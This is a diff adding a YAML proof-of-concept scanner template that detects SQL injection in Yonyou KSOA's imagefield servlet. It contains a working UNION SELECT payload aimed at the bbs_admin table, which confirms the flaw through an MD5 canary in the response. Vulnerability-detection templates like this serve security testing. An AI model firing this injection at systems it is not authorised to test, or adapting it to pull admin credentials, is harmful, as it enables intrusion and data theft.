@@ -1,0 +1,12 @@
+name: poc-yaml-nc-ksoa-imagefield-sqli
+rules:
+    - method: GET
+      path: /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271314520%27))--+
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'0xb206e95a4384298962649e58dc7b39d4')
+detail:
+    author: nc-ksoa-imagefield-sqli
+    links:
+        - app="用友-时空KSOA"
+
